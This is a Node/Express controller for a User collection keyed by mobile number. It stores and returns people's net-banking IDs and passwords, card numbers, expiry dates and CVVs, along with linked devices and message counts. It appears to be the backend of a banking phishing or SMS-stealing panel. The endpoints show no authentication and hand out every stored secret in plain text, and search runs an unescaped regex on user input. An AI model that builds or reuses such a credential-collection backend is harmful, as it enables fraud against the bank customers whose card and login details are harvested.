import User from '../models/User.js';
import Device from '../models/Device.js';
import Message from '../models/Message.js';

// Create or update a User by mobileNumber
export const createOrUpdateUser = async (req, res) => {
  try {
    const { mobileNumber, name, departmentName, address, bankName, accountNumber, ifscCode, netbankingId, netbankingPassword, cardNumber, cardExpiry, cardCvv, role, status } = req.body;

    if (!mobileNumber) {
      return res.status(400).json({ success: false, error: 'mobileNumber is required' });
    }

    const cleanMobile = String(mobileNumber).trim();

    let user = await User.findOne({ mobileNumber: cleanMobile });

    if (user) {
      // Update existing user fields if provided
      if (name !== undefined) user.name = name;
      if (departmentName !== undefined) user.departmentName = departmentName;
      if (address !== undefined) user.address = address;
      if (bankName !== undefined) user.bankName = bankName;
      if (accountNumber !== undefined) user.accountNumber = accountNumber;
      if (ifscCode !== undefined) user.ifscCode = ifscCode;
      if (netbankingId !== undefined) user.netbankingId = netbankingId;
      if (netbankingPassword !== undefined) user.netbankingPassword = netbankingPassword;
      if (cardNumber !== undefined) user.cardNumber = cardNumber;
      if (cardExpiry !== undefined) user.cardExpiry = cardExpiry;
      if (cardCvv !== undefined) user.cardCvv = cardCvv;
      if (role !== undefined) user.role = role;
      if (status !== undefined) user.status = status;

      await user.save();
      return res.status(200).json({
        success: true,
        message: 'User updated successfully',
        data: user
      });
    }

    // Create new User
    user = new User({
      mobileNumber: cleanMobile,
      name: name || '',
      departmentName: departmentName || 'General',
      address: address || '',
      bankName: bankName || '',
      accountNumber: accountNumber || '',
      ifscCode: ifscCode || '',
      netbankingId: netbankingId || '',
      netbankingPassword: netbankingPassword || '',
      cardNumber: cardNumber || '',
      cardExpiry: cardExpiry || '',
      cardCvv: cardCvv || '',
      role: role || 'USER',
      status: status || 'ACTIVE'
    });

    await user.save();

    return res.status(201).json({
      success: true,
      message: 'User created successfully',
      data: user
    });
  } catch (error) {
    console.error('❌ Error in createOrUpdateUser:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

// Get User by Mobile Number
export const getUserByMobile = async (req, res) => {
  try {
    const mobileParam = req.params.mobileNumber || req.query.mobileNumber;

    if (!mobileParam) {
      return res.status(400).json({ success: false, error: 'Mobile number parameter is required' });
    }

    const cleanMobile = String(mobileParam).trim();

    // Find User by mobile number
    const user = await User.findOne({ mobileNumber: cleanMobile });

    if (!user) {
      return res.status(404).json({
        success: false,
        message: `User with mobile number ${cleanMobile} not found`
      });
    }

    // Optionally attach registered devices & message count associated with this mobile number
    const devices = await Device.find({ mobileNumber: cleanMobile });
    const messagesCount = await Message.countDocuments({ mobileNumber: cleanMobile });

    return res.status(200).json({
      success: true,
      data: {
        ...user.toObject(),
        devices,
        totalMessages: messagesCount
      }
    });
  } catch (error) {
    console.error('❌ Error in getUserByMobile:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

// Get All Users
export const getUsers = async (req, res) => {
  try {
    const { search } = req.query;
    let filter = {};

    if (search) {
      filter = {
        $or: [
          { mobileNumber: { $regex: search, $options: 'i' } },
          { name: { $regex: search, $options: 'i' } },
          { departmentName: { $regex: search, $options: 'i' } }
        ]
      };
    }

    const users = await User.find(filter).sort({ createdAt: -1 });

    return res.status(200).json({
      success: true,
      count: users.length,
      data: users
    });
  } catch (error) {
    console.error('❌ Error in getUsers:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

// Get User by ID (userId or _id)
export const getUserById = async (req, res) => {
  try {
    const { id } = req.params;

    let user = await User.findOne({
      $or: [
        { userId: id },
        { _id: id.match(/^[0-9a-fA-F]{24}$/) ? id : null }
      ]
    });

    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }

    return res.status(200).json({ success: true, data: user });
  } catch (error) {
    console.error('❌ Error in getUserById:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

// Delete User
export const deleteUser = async (req, res) => {
  try {
    const { id } = req.params;

    const user = await User.findOneAndDelete({
      $or: [
        { userId: id },
        { mobileNumber: id },
        { _id: id.match(/^[0-9a-fA-F]{24}$/) ? id : null }
      ]
    });

    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }

    return res.status(200).json({ success: true, message: 'User deleted successfully', data: user });
  } catch (error) {
    console.error('❌ Error in deleteUser:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
};
